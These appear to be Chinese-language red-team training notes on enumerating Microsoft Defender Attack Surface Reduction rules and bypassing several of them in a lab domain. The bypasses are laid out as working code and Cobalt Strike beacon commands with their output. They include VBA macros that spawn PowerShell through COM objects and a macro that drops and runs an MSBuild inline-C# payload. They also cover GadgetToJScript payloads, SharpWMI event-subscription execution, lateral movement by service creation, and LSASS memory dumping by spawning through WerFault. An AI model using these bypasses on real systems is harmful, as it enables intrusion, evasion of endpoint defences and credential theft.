# Attack Surface Reduction

[Attack Surface Reduction](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction?view=o365-worldwide)（ASR）是一套加固配置，旨在减轻攻击者通常使用的攻击技术，ASR规则在LUA中实现，由Windows Defender执行，包括以下模块(加粗为本章重点)

Block abuse of exploited vulnerable signed drivers
Block Adobe Reader from creating child processes

**Block all Office applications from creating child processes**（阻止所有 Office 应用程序创建子进程）
**Block credential stealing from the Windows local security authority subsystem (lsass.exe)**（阻止从 Windows 本地安全权限子系统(lsass.exe)窃取凭据）

Block executable content from email client and webmail
Block executable files from running unless they meet a prevalence, age, or trusted list criterion
Block execution of potentially obfuscated scripts
Block JavaScript or VBScript from launching downloaded executable content
Block Office applications from creating executable content

**Block Office applications from injecting code into other processes**（阻止 Office 应用程序向其他进程注入代码）

Block Office communication application from creating child processes
Block persistence through WMI event subscription

**Block process creations originating from PSExec and WMI commands**（源自 PSExec 和 WMI 命令的块进程创建）

Block untrusted and unsigned processes that run from USB

**Block Win32 API calls from Office macros**（阻止来自 Office 宏的 Win32API 调用）

Use advanced protection against ransomware


## Enumeration

SR 规则可以通过GPO，本地注册表，或者或 PowerShell 的 Get-MpPreferences cmdlet 进行枚举

1. GPO

按名称搜索 GPO

```
beacon> powershell-import /root/tools/PowerView.ps1
beacon> powerpick Get-DomainGPO -Name ASR -Properties GpcFileSysPath

gpcfilesyspath                                                                              
--------------                                                                              
\\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}

beacon> ls \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 554b     fil     11/12/2021 18:02:45   comment.cmtx
 1kb      fil     11/12/2021 18:02:45   Registry.pol
```

下载 Registry.pol 

```
beacon> download \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine\Registry.pol
[*] Tasked beacon to download \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine\Registry.pol
[+] host called home, sent: 121 bytes
[*] started download of \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine\Registry.pol (1588 bytes)
[*] download of Registry.pol is complete
```

并使用 Parse-PolFile 读取它
```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR
ValueName   : ExploitGuard_ASR_Rules
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules
ValueName   : d4f940ab-401b-4efc-aadc-ad5f3c50688a
ValueType   : REG_SZ
ValueLength : 4
ValueData   : 1
```

ExploitGuard_ASR_Rules的ValueData是1，表示启用了 ASR 规则

下面是 GUID 提供的每个 ASR 规则
D4f940ab-401b-4efc-aadc-ad5f3c50688a 阻止所有 Office 应用程序创建子进程，其可能的值是：

0 - Disable
1 - Block
2 - Audit
6 - Warn


可以通过 Get-DomainOU 和-GPLink 参数找到这个 GPO 应用于哪些 OU (以及随后应用于哪些机器)。这将只返回 gplink 属性中指定的 GPOGUID 的 OU

```
beacon> powerpick Get-DomainOU -GPLink 0047C7A8-63E1-4F60-A981-D5DD7F3F8663 -Properties DistinguishedName

distinguishedname                           
-----------------                           
OU=2,OU=Workstations,DC=redteamops2,DC=local

beacon> powerpick Get-DomainComputer -SearchBase "LDAP://OU=2,OU=Workstations,DC=redteamops2,DC=local" -Properties SamAccountName

samaccountname
--------------
WKSTN-2$  
```


2. 注册表

To read from a local registry, simply query HKLM:

```
beacon> reg query x64 HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR

ExploitGuard_ASR_Rules   1

beacon> reg query x64 HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules

d4f940ab-401b-4efc-aadc-ad5f3c50688a 1
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 1
75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 1
d1e49aac-8f56-4280-b9ba-993a6d77406c 1
92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b 1
```

3. powershell

```
beacon> powerpick Get-MpPreference | select -expand AttackSurfaceReductionRules_Ids

75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84
92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
d1e49aac-8f56-4280-b9ba-993a6d77406c
d4f940ab-401b-4efc-aadc-ad5f3c50688a

beacon> powerpick Get-MpPreference | select -expand AttackSurfaceReductionRules_Actions

1
1
1
1
1
```

# Block Child Processes(阻塞子进程)

> "This rule blocks Office apps from creating child processes. This includes Word, Excel, PowerPoint, OneNote, and Access."(“此规则阻止 Office 应用程序创建子进程。包括 Word、 Excel、 PowerPoint、 OneNote 和 Access。”)

被阻塞时弹框

1683862477134.jpg

任何解决？

使用COM bypass

> 但不是每个COM对象都能做到--LocalServer32键必须被设置，以便进程有一个不是Office应用程序的父级。 例如，MMC20.Application对象将使用mmc.exe作为父对象，而ShellWindows和ShellBrowserWindow ShellExecute方法将使用explorer.exe作为父对象。(Not every COM object will do though - the LocalServer32 key must be set so that the process will have a parent that is not the Office application.  For instance, the MMC20.Application object will use mmc.exe as the parent, and both the ShellWindows and ShellBrowserWindow ShellExecute methods will use explorer.exe as the parent.)


面是一个使用 MMC20.Application 的例子:

```
Sub Exec()
    Dim mmc As Object
    Set mmc = CreateObject("MMC20.Application")
    mmc.Document.ActiveView.ExecuteShellCommand "powershell", "", "", "7"
    Set mmc = Nothing
End Sub
```

下面是另一个使用 ShellWindows 的例子:

这将不会产生一个可见的 PowerShell 窗口，但是它将作为  explorer.exe 的子窗口运行。这可能是产生 PowerShell 的最 OPSEC 方式(就 OPSEC 和 PowerShell 而言)。
```
Sub Exec()
    Dim com As Object
    Set com = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    com.Item.Document.Application.ShellExecute "powershell", "", "", Null, 0
    Set com = Nothing
End Sub
```

**LOLBAS**

在启用此规则时，并非所有进程都被阻塞,WScript.Shell依然可以使用

1683862769161.jpg

这表明 ASR 规则实际上是基于某种黑名单的，因此可以使用基于命令行的执行。寻找这些的一个显而易见的地方是 [LOLBAS](https://lolbas-project.github.io/) 项目


MSBuild（以.xml 或者 .csproj做后缀的文件）可以内联C#代码，文档[在此](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-project-file-schema-reference?view=vs-2022)

一个例子
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
    <ASRSucks />
  </Target>
  <UsingTask
    TaskName="ASRSucks"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        
        public class ASRSucks : Task, ITask
        {         
          public override bool Execute()
          {
              Console.WriteLine("Hello from C#!");
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

上面文件可以这样执行
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe test.xml
```

唯一的要求是，我们要把这段代码放到磁盘上。 一种策略是把代码保存在文档的某个地方（比如注释），用宏来获取它，写到磁盘上并执行。(The only requirement is that we drop this code to disk.  One strategy could be to save the code somewhere in the document (such as the comments), fetch it with the Macro, write to disk and execute.)


1683863156748.jpg

宏
```
Sub Exec()
    Dim comment As String
    Dim fSo As Object
    Dim dropper As Object
    Dim wsh As Object
    Dim temp As String
    Dim command As String
    
    temp = LCase(Environ("TEMP"))
    
    Set fSo = CreateObject("Scripting.FileSystemObject")
    Set dropper = fSo.CreateTextFile(temp & "\code.xml", True)
    
    comment = ActiveDocument.BuiltInDocumentProperties("Comments").Value
    
    dropper.WriteLine comment
    dropper.Close
    
    Set wsh = CreateObject("WScript.Shell")
    
    command = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe " & temp & "\code.xml"
    
    wsh.Run command
    
    Set fSo = Nothing
    Set dropper = Nothing
    Set wsh = Nothing
End Sub
```

# Block Win32 APIs

> "This rule prevents VBA macros from calling Win32 APIs."(“此规则防止 VBA 宏调用 Win32API。”)

使用 [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript)调用可以绕过上面

创建一个新的.cs文件

```
using System;
using System.Runtime.InteropServices;

public class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    public Program()
    {
        MessageBoxW(IntPtr.Zero, "Hello from GadgetToJScript", "Hello World", 0);
    }
}
```

When we run G2JS, we provide the source code and specify the output type.

```
C:\Tools\GadgetToJScript>GadgetToJScript\bin\Debug\GadgetToJScript.exe -c TestAssembly\Program.cs -o C:\Users\Administrator\Desktop\vba -w vba -b
[+]: Generating the vba payload
[+]: First stage gadget generation done.
[+]: Compiling your .NET code located at:TestAssembly\Program.cs
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Users\Administrator\Desktop\vba.vba
```

复制 VBA 文件的内容

将其粘贴到 WKSTN-2上的 Word 中并执行

1683870553467.jpg

# Block Code Injection

> "This rule blocks code injection attempts from Office apps into other processes."(“此规则阻止将代码从 Office 应用程序注入到其他进程的尝试。”)


内联声明（Inline declarations）

错误：
```
WriteProcessMemory(
    pi.hProcess,
    baseAddress,
    shellcode,
    shellcode.Length,
    out _);
```


正确:
```
IntPtr bytesWriten;
WriteProcessMemory(
    pi.hProcess,
    baseAddress,
    shellcode,
    shellcode.Length,
    out bytesWriten);
```

# Block PsExec / WMI

> "This rule blocks processes created through PsExec and WMI from running."(“此规则阻止通过 PsExec 和 WMI 创建的进程运行。”)

尝试通过 PsExec 在远程目标上执行二进制文件失败。
```
C:\Users\cbridges>C:\Sysinternals\PsExec64.exe \\wkstn-2 cmd.exe

PsExec v2.32 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

PsExec could not start cmd.exe on wkstn-2:
The system cannot find the file specified.
```

这条规则似乎是针对Sysinternals PsExec实现的--它并不阻止你创建和启动任意的服务，这使得这一点很容易被绕过。 只要把你自己的服务二进制文件放到磁盘上，然后创建一个服务来运行它。(It appears this rule is specific to the Sysinternals PsExec implementation - it does not prevent you from creating and starting arbitrary services, which makes this trivial to bypass.  Simply drop your own service binary to disk and create a service to run it.)

```
beacon> cd \\wkstn-2\admin$
beacon> upload /root/beacon-svc.exe
beacon> run sc \\wkstn-2 create RandoService binPath= C:\Windows\beacon-svc.exe

[SC] CreateService SUCCESS

beacon> run sc \\wkstn-2 start RandoService

SERVICE_NAME: RandoService 
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2056
        FLAGS              : 

beacon> link wkstn-2
[+] established link to child beacon: 10.10.120.75

beacon> rm beacon-svc.exe
beacon> run sc \\wkstn-2 delete RandoService

[SC] DeleteService SUCCESS
```


这也意味着jump命令可以工作。


1683875545051.jpg

## wmi
与 PsExec 一样，尝试通过 ```wmic /node``` 或 Cobalt Strike 的 ```remote-exec wmi``` 命令执行二进制文件时被阻止。

```
beacon> run wmic /node:"wkstn-2" process call create "C:\Windows\System32\win32calc.exe"

Executing (Win32_Process)->Create()

Method execution successful.

Out Parameters:
instance of __PARAMETERS
{
	ReturnValue = 2;
};
```

解决这个问题的方法是通过事件订阅使用 VBScript 有效负载

步骤：

1. Generate a payload
2. Connect to WMI
3. Create an event filter to trigger the execution (via a timer)
4. Create an ActiveScriptEventConsumer, using the VBScript engine
5. Create a FilterToConsumerBinding to link the filter and consumer
6. Wait for execution
7. Delete all of the above

[SharpWMI](https://github.com/GhostPack/SharpWMI)集成了上面的步骤

我们可以使用我们的一个C#进程注入项目和GadgetToJScript的-w vbs选项，将其写入一个.vbs文件。

```
C:\Tools\GadgetToJScript>GadgetToJScript\bin\Debug\GadgetToJScript.exe -a TestAssembly\bin\Debug\TestAssembly.dll -w vbs -o C:\Users\Administrator\Desktop\wmi -b
[+]: Generating the vbs payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:TestAssembly\bin\Debug\TestAssembly.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Users\Administrator\Desktop\wmi.vbs
```

这里有一些问题。 SharpWMI 的 script= 参数希望从运行 Beacon 的机器的磁盘上读取 VBS 文件（而不是从你的主机上），或者它将输入作为原始 VBS。 scriptb64=参数将VBS作为一个单一的base64编码的字符串，但G2JS小工具太大，无法在CS命令行中容纳。 这方面的一个解决方案是直接将小工具硬编码到SharpWMI程序中，尽管这远非理想。(There are some gotcha's from here.  SharpWMI's script= parameter expects to read the VBS file off disk of the machine running Beacon (not from your host), or it takes the input as raw VBS.  The scriptb64= parameter takes the VBS as a single base64 encoded string, but the G2JS gadget is too large to fit on the CS command line.  A solution to this, though far from ideal, is to hardcode the gadget directly into the SharpWMI assembly.)


 Program.cs 这一行改为：
 ```
 private static string HardcodedGadget = @"<PUT YOUR VBS HERE>";
 ```
 
 在这个文件中，也有一个叫做GetVBSPayload的方法，它返回一个字符串。 它通常根据你的script=或scriptb64=输入返回一个VBS有效载荷。 但我要通过这样的方式强迫这个方法总是返回硬编码的小工具：
 
```
static string GetVBSPayload(Dictionary<string, string> arguments)
{
    return HardcodedGadget;
}
```

然后重新编译程序集并执行它

```
beacon> execute-assembly /root/tools/SharpWMI2.exe action=executevbs computername=wkstn-2 script=blah

[*] Using direct script's parameter as VBScript payload.
[*] Script will trigger after 10 and we'll wait for 12 seconds.

[*] Creating Event Subscription Debug : wkstn-2 - with interval between events: 10 secs
[*] Setting 'Debug' event filter on wkstn-2
[*] Setting 'Debug' event consumer on wkstn-2 to kill script after 12 secs
[*] Binding 'Debug' event filter and consumer on wkstn-2

[*] Waiting 10 seconds for event to trigger on wkstn-2 ...

[*] Removing 'Timer' internal timer from wkstn-2
[*] Removing FilterToConsumerBinding from wkstn-2
[*] Removing 'Debug' event filter from wkstn-2
[*] Removing 'Debug' event consumer from wkstn-2
```

The VBS is executed by scrcons.exe (WMI Standard Event Consumer), so if your injector performs "self-injection" (e.g. var target = Process.GetCurrentProcess();), the Beacon will be running inside this process.

1683877422578.jpg


# Block Credential Stealing from LSASS

> "This rule helps prevent credential stealing, by locking down Local Security Authority Subsystem Service (LSASS)."(“这项规定通过锁定本地安全认证子系统服务(lsASS) ，有助于防止credential被盗。”)

本质上，这个规则阻止您使用  PROCESS_VM_READ 特权打开 LSASS 句柄。例如，我们可以尝试使用 MiniDumpWriteDumpAPI 读取 LSASS。

```
beacon> getuid
[*] You are RTO2\amoss (admin)

beacon> spawnto x64 C:\Windows\System32\notepad.exe
[*] Tasked beacon to spawn x64 features to: C:\Windows\System32\notepad.exe

beacon> execute-assembly C:\Tools\MiniDumpWriteDump\bin\Debug\MiniDumpWriteDump.exe
[X] MiniDumpWriteDump Failed
```


与其他ASR规则一样，并不是所有的进程似乎都被阻止了。 WerFault（Windows错误报告）是一个负责Windows上错误报告的应用程序。 当一个应用程序崩溃时，werfault.exe作为一个子程序被生成，并为报告目的收集调试信息。(As with other ASR rules, not all processes appear to be blocked.  WerFault (Windows Error Reporting) is an application responsible for error reporting on Windows.  When an application crashes, werfault.exe is spawned as a child and collects debug information for reporting purposes.)

通过将spawnto设置为werfault，我们可以获得LSASS的句柄，包括读取其内存的权限。(By setting our spawnto to werfault, we can obtain a handle to LSASS which includes the permission to read its memory.)

```
beacon> spawnto x64 C:\Windows\System32\WerFault.exe
[*] Tasked beacon to spawn x64 features to: C:\Windows\System32\WerFault.exe
[+] host called home, sent: 40 bytes

beacon> execute-assembly C:\Tools\MiniDumpWriteDump\bin\Debug\MiniDumpWriteDump.exe
[!] MiniDumpWriteDump Succeeded
```